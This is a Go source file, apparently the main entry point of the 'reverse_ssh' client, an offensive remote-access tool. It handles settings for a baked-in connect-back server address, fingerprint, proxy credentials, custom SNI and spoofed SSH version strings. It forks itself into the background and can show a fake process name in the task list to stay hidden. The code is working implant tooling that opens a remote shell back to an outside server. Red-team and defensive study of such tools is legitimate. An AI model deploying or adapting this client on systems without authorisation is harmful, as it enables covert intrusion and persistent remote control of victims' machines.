package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
	"github.com/NHAS/reverse_ssh/internal/terminal"
	"github.com/NHAS/reverse_ssh/pkg/logger"
)

func fork(path string, sysProcAttr *syscall.SysProcAttr, pretendArgv ...string) error {

	cmd := exec.Command(path)
	cmd.Args = pretendArgv
	cmd.Env = append(os.Environ(), "F="+strings.Join(os.Args, " "))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.SysProcAttr = sysProcAttr

	err := cmd.Start()

	if cmd.Process != nil {
		cmd.Process.Release()
	}

	return err
}

var (
	destination string
	fingerprint string
	proxy       string
	ignoreInput string
	customSNI   string
	// golang can only embed strings using the compile time linker
	useHostKerberos string
	logLevel        string

	ntlmProxyCreds string

	versionString string
)

func printHelp() {
	fmt.Println("usage: ", filepath.Base(os.Args[0]), "--[foreground|fingerprint|proxy|process_name] -d|--destination <server_address>")
	fmt.Println("\t\t-d or --destination\tServer connect back address (can be baked in)")
	fmt.Println("\t\t--foreground\tCauses the client to run without forking to background")
	fmt.Println("\t\t--fingerprint\tServer public key SHA256 hex fingerprint for auth")
	fmt.Println("\t\t--proxy\tLocation of HTTP connect proxy to use")
	fmt.Println("\t\t--ntlm-proxy-creds\tNTLM proxy credentials in format DOMAIN\\USER:PASS")
	fmt.Println("\t\t--process_name\tProcess name shown in tasklist/process list")
	fmt.Println("\t\t--sni\tWhen using TLS set the clients requested SNI to this value")
	fmt.Println("\t\t--log-level\tChange logging output levels, [INFO,WARNING,ERROR,FATAL,DISABLED]")
	fmt.Println("\t\t--version-string\tSSH version string to use, i.e SSH-VERSION, defaults to internal.Version-runtime.GOOS_runtime.GOARCH")
	if runtime.GOOS == "windows" {
		fmt.Println("\t\t--host-kerberos\tUse kerberos authentication on proxy server (if proxy server specified)")
	}
}

func makeInitialSettings() (*client.Settings, error) {
	// set the initial settings from the embedded values first
	settings := &client.Settings{
		Fingerprint:          fingerprint,
		ProxyAddr:            proxy,
		Addr:                 destination,
		ProxyUseHostKerberos: useHostKerberos == "true",
		SNI:                  customSNI,
		VersionString:        versionString,
	}

	if ntlmProxyCreds != "" {
		if err := settings.SetNTLMProxyCreds(ntlmProxyCreds); err != nil {
			return nil, fmt.Errorf("embedded ntlm proxy credentials are invalid: %q: %w", ntlmProxyCreds, err)
		}
	}

	return settings, nil
}

func main() {

	settings, err := makeInitialSettings()
	if err != nil {
		log.Fatal(err)
	}

	if len(os.Args) == 0 || ignoreInput == "true" {
		Run(settings)
		return
	}

	os.Args[0] = strconv.Quote(os.Args[0])
	var argv = strings.Join(os.Args, " ")

	realArgv, child := os.LookupEnv("F")
	if child {
		argv = realArgv
	}

	os.Unsetenv("F")

	line := terminal.ParseLine(argv, 0)

	if line.IsSet("h") || line.IsSet("help") {
		printHelp()
		return
	}

	fg := line.IsSet("foreground")

	proxyaddress, _ := line.GetArgString("proxy")
	if len(proxyaddress) > 0 {
		settings.ProxyAddr = proxyaddress
	}

	userSpecifiedFingerprint, err := line.GetArgString("fingerprint")
	if err == nil {
		settings.Fingerprint = userSpecifiedFingerprint
	}

	userSpecifiedSNI, err := line.GetArgString("sni")
	if err == nil {
		settings.SNI = userSpecifiedSNI
	}

	userSpecifiedNTLMCreds, err := line.GetArgString("ntlm-proxy-creds")
	if err == nil {
		if line.IsSet("host-kerberos") {
			log.Fatal("You cannot use both the host kerberos credentials and static ntlm proxy credentials at once. --host-kerberos and --ntlm-proxy-creds")
		}

		err = settings.SetNTLMProxyCreds(userSpecifiedNTLMCreds)
		if err != nil {
			log.Fatalf("invalid static ntlm credentials specified %q: %v", userSpecifiedNTLMCreds, err)
		}
	}

	if line.IsSet("host-kerberos") {
		settings.ProxyUseHostKerberos = true
	}

	versionString, err := line.GetArgString("version-string")
	if err == nil {
		settings.VersionString = versionString
	}

	tempDestination, err := line.GetArgString("d")
	if err != nil {
		tempDestination, _ = line.GetArgString("destination")
	}

	if len(tempDestination) > 0 {
		settings.Addr = tempDestination
	}

	if len(settings.Addr) == 0 && len(line.Arguments) > 1 {
		// Basically take a guess at the arguments we have and take the last one
		settings.Addr = line.Arguments[len(line.Arguments)-1].Value()
	}

	var actualLogLevel logger.Urgency = logger.INFO
	userSpecifiedLogLevel, err := line.GetArgString("log-level")
	if err == nil {
		actualLogLevel, err = logger.StrToUrgency(userSpecifiedLogLevel)
		if err != nil {
			log.Fatalf("Invalid log level: %q, err: %s", userSpecifiedLogLevel, err)
		}
	} else if logLevel != "" {
		actualLogLevel, err = logger.StrToUrgency(logLevel)
		if err != nil {
			actualLogLevel = logger.INFO
			log.Println("Default log level as invalid, setting to INFO: ", err)
		}
	}
	logger.SetLogLevel(actualLogLevel)

	if len(settings.Addr) == 0 {
		fmt.Println("No destination specified")
		printHelp()
		return
	}

	if fg || child {
		Run(settings)
		return
	}

	if strings.HasPrefix(destination, "stdio://") {
		// We cant fork off of an inetd style connection or stdin/out will be closed
		log.SetOutput(io.Discard)
		Run(settings)
		return
	}

	processArgv, _ := line.GetArgsString("process_name")
	err = Fork(settings, processArgv...)
	if err != nil {
		Run(settings)
	}

}
